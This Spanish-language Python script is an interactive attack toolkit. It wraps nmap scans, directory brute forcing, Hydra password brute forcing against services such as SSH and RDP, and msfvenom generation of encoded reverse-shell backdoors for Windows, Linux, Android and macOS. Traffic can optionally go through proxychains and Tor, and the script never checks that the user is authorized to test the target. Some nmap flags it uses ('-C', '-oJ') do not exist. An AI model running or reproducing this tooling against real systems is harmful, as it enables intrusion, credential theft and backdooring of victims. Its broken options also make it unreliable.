import re
import subprocess
import time

def validar_objetivo(objetivo):
    ip_regex = r"^\d{1,3}(\.\d{1,3}){3}$"
    dominio_regex = r"^([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$"
    ipv6_regex = r"^([0-9a-fA-F:]+)$"
    if re.match(ip_regex, objetivo) or re.match(dominio_regex, objetivo) or re.match(ipv6_regex, objetivo):
        return True
    return False

def ejecutar_comando(comando):
    global usar_proxychains
    if usar_proxychains:
        comando = ["proxychains"] + comando
    print(f"\nEjecutando: {' '.join(comando)}")
    inicio = time.time()
    try:
        subprocess.run(comando, check=True)
        print(f"Escaneo completado en {round(time.time() - inicio, 2)} segundos.")
    except subprocess.CalledProcessError as e:
        print(f"Error al ejecutar Nmap: {e}")
    except FileNotFoundError:
        print("Nmap no está instalado o no se encuentra en el PATH.")

def escaneo_basico(target, min_rate, extra=""):
    comando = [
        "nmap", "-p-", "--open", "--min-rate", str(min_rate),
        "-Pn", "-n", "-vvv", target, "-oN", "nmap_result.txt"
    ]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)

def escaneo_servicios(target, extra=""):
    comando = [
        "nmap", "-sV", "-Pn", "-n", "-vvv", target, "-oN", "nmap_servicios.txt"
    ]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)

def escaneo_os(target, extra=""):
    comando = [
        "nmap", "-O", "-Pn", "-n", "-vvv", target, "-oN", "nmap_os.txt"
    ]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)

def escaneo_xml(target, extra=""):
    comando = [
        "nmap", "-p-", "--open", "-Pn", "-n", "-vvv", target, "-oX", "nmap_result.xml"
    ]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)

def escaneo_json(target, extra=""):
    comando = [
        "nmap", "-p-", "--open", "-Pn", "-n", "-vvv", target, "-oJ", "nmap_result.json"
    ]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)

def escaneo_servicios_C(target, extra=""):
    comando = [
        "nmap", "-sV", "-C", "-Pn", "-n", "-vvv", target, "-oN", "nmap_svC.txt"
    ]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)

def escaneo_agresivo(target, extra=""):
    comando = [
        "nmap", "-A", "-Pn", "-n", "-vvv", target, "-oN", "nmap_agresivo.txt"
    ]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)

def escaneo_syn(target, extra=""):
    comando = [
        "nmap", "-sS", "-Pn", "-n", "-vvv", target, "-oN", "nmap_syn.txt"
    ]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)

def escaneo_sigiloso(target, nivel, extra=""):
    comando = [
        "nmap", "-sS", "-T" + str(nivel), "-Pn", "-n", "-vvv", target, "-oN", f"nmap_sigiloso_T{nivel}.txt"
    ]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)

def escaneo_ipv6(target, extra=""):
    comando = [
        "nmap", "-6", "-Pn", "-n", "-vvv", target, "-oN", "nmap_ipv6.txt"
    ]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)

def escaneo_nse_vuln(target, extra=""):
    comando = [
        "nmap", "--script", "vuln", "-Pn", "-n", "-vvv", target, "-oN", "nmap_vuln.txt"
    ]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)

def escaneo_arp(target, extra=""):
    comando = [
        "nmap", "-PR", "-n", "-vvv", target, "-oN", "nmap_arp.txt"
    ]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)





def escaneo_nmap_msf(target, extra=""):
    print("Función escaneo_nmap_msf aún no implementada.")

# Elimina la función escaneo_arp duplicada y deja solo una versión.
# Elimina el segundo print en ayuda_android y deja solo uno.

def ayuda_android():
    print("""
Para usar Nmap en Android (Termux):
1. Instala Termux desde Google Play o F-Droid.
2. Instala Nmap con: pkg install nmap
3. Ejecuta los mismos comandos que en Linux.
Ejemplo: nmap -sV 192.168.1.1
""")


def escaneo_dirsearch(target, extra=""):
    comando = ["dirsearch", "-u", target]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)

def escaneo_hydra(target, servicio, usuario, diccionario, hilos):
    comando = [
        "hydra", "-l", usuario, "-P", diccionario, "-t", str(hilos), target, servicio
    ]
    ejecutar_comando(comando)


def escaneo_gobuster(target, wordlist, ext, threads):
    comando = [
        "gobuster", "dir", "-u", target, "-w", wordlist, "-t", str(threads)
    ]
    if ext:
        comando += ["-x", ext]
    ejecutar_comando(comando)

def escaneo_nessus(target):
    print(f"Lanza el escaneo de Nessus manualmente para el objetivo: {target}")
    print("Puedes automatizar esto usando la API REST de Nessus o el CLI cuando lo configures.")


def generar_payload_msfvenom():
    plataforma = input("Plataforma (windows, linux, android, osx, etc.): ").lower()
    tipo_payload = input("Tipo de payload (ejemplo: meterpreter/reverse_tcp): ")
    lhost = input("LHOST (IP atacante): ")
    lport = input("LPORT (puerto atacante): ")
    nombre = input("Nombre de archivo de salida (ejemplo: shell.exe, backdoor.apk): ")

    formato = ""
    if plataforma == "windows":
        formato = "exe"
    elif plataforma == "linux":
        formato = "elf"
    elif plataforma == "android":
        formato = "apk"
    elif plataforma in ["osx", "mac", "macos"]:
        formato = "macho"
    else:
        formato = input("Formato de archivo (ejemplo: exe, elf, apk, macho): ")

    usar_encoder = input("¿Quieres usar encoder? (s/n): ").lower() == "s"
    encoder = ""
    veces = ""
    badchars = ""
    if usar_encoder:
        encoder = input("Nombre del encoder (ejemplo: x86/shikata_ga_nai): ")
        veces = input("¿Cuántas veces aplicar el encoder? (ejemplo: 5): ")
        if not veces.isdigit() or int(veces) < 1:
            veces = "1"
        badchars = input("Badchars (caracteres a evitar, ejemplo: '\\x00\\x0a\\x0d') [deja vacío si no]: ")

    comando = [
        "msfvenom",
        "-p", f"{plataforma}/{tipo_payload}",
        "LHOST=" + lhost,
        "LPORT=" + lport,
        "-f", formato,
        "-o", nombre
    ]
    if usar_encoder:
        comando += ["-e", encoder, "-i", veces]
        if badchars:
            comando += ["-b", badchars]

    print(f"\nEjecutando: {' '.join(comando)}")
    try:
        subprocess.run(comando, check=True)
        print(f"Payload generado: {nombre}")
    except subprocess.CalledProcessError as e:
        print(f"Error al generar el payload: {e}")

def mostrar_ayuda(): 
    print("""
Opciones de escaneo:
1. Escaneo básico (puertos, --open, --min-rate)
2. Escaneo de servicios y versiones (-sV)
3. Detección de sistema operativo (-O)
4. Guardar resultado en XML
5. Guardar resultado en JSON
6. Escaneo de servicios con -sV -C
7. Escaneo agresivo (-A)
8. Escaneo SYN sigiloso (-sS)
9. Escaneos sigilosos con T1, T2, T3, T4
10. Escaneo IPv6
11. Escaneo de vulnerabilidades con NSE (--script vuln)
12. Escaneo ARP para MACs (-PR)
13. Ayuda para Nmap en Android
14. Escaneo Nmap y carga en Metasploit (db_import)
15. Escaneo de directorios con Dirsearch
16. Fuerza bruta con Hydra (FTP, SSH, MySQL)
17. Escaneo de directorios y archivos con Gobuster
18. Escaneo de vulnerabilidades con Nessus
19. Generar payloads con msfvenom (Windows, Linux, Android, Mac, etc.)
h.  Mostrar esta ayuda 
""")
                    
if __name__ == "__main__":
    usar_proxychains = input("¿Quieres usar proxychains y Tor para el escaneo? (s/n): ").lower() == "s"
    objetivo = input("Introduce la IP, dominio o IPv6 objetivo: ")
    if not validar_objetivo(objetivo):
        print("Objetivo inválido. Introduce una IP, dominio o IPv6 válido.")
        exit(1)

    mostrar_ayuda()
    opcion = input("Elige una opción (1-19, h para ayuda): ")
    extra = input("¿Quieres añadir parámetros extra a Nmap? (deja vacío si no): ")
    if extra.lower() in ["si", "no"]:
        extra = ""

    if opcion == "1":
        while True:
            min_rate = input("Introduce el valor de --min-rate (ejemplo: 200 o 5000): ")
            if min_rate.isdigit() and int(min_rate) > 0:
                min_rate = int(min_rate)
                break
            else:
                print("Por favor, introduce un número entero positivo.")
        escaneo_basico(objetivo, min_rate, extra)
    elif opcion == "2":
        escaneo_servicios(objetivo, extra)
    elif opcion == "3":
        escaneo_os(objetivo, extra)
    elif opcion == "4":
        escaneo_xml(objetivo, extra)
    elif opcion == "5":
        escaneo_json(objetivo, extra)
    elif opcion == "6":
        escaneo_servicios_C(objetivo, extra)
    elif opcion == "7":
        escaneo_agresivo(objetivo, extra)
    elif opcion == "8":
        escaneo_syn(objetivo, extra)
    elif opcion == "9":
        for nivel in range(1, 5):
            escaneo_sigiloso(objetivo, nivel, extra)
    elif opcion == "10":
        escaneo_ipv6(objetivo, extra)
    elif opcion == "11":
        escaneo_nse_vuln(objetivo, extra)
    elif opcion == "12":
        escaneo_arp(objetivo, extra)
    elif opcion == "13":
        ayuda_android()
    elif opcion == "14":
        escaneo_nmap_msf(objetivo, extra)
    elif opcion == "15":
        escaneo_dirsearch(objetivo, extra)
    elif opcion == "16":
        servicio = input("Servicio a atacar (ejemplo: ftp, ssh, mysql, http, smb, rdp, telnet, vnc, etc.): ")
        usuario = input("Usuario objetivo: ")
        diccionario = input("Ruta al diccionario de contraseñas: ")
        hilos = input("Número de hilos (ejemplo: 4, 8, 16): ")
        if not hilos.isdigit() or int(hilos) < 1:
            hilos = "4"
        escaneo_hydra(objetivo, servicio, usuario, diccionario, hilos)
    elif opcion == "17":
        wordlist = input("Ruta al diccionario de palabras (ejemplo: /usr/share/wordlists/dirb/common.txt): ")
        ext = input("Extensiones a buscar (ejemplo: php,txt) [deja vacío si no]: ")
        threads = input("Número de hilos (ejemplo: 10, 20): ")
        if not threads.isdigit() or int(threads) < 1:
            threads = "10"
        escaneo_gobuster(objetivo, wordlist, ext, threads)
    
    elif opcion == "18":
        escaneo_nessus(objetivo)
    elif opcion == "19":
        generar_payload_msfvenom()
    elif opcion.lower() == "h":
        mostrar_ayuda()
    else:
        print("Opción no válida.")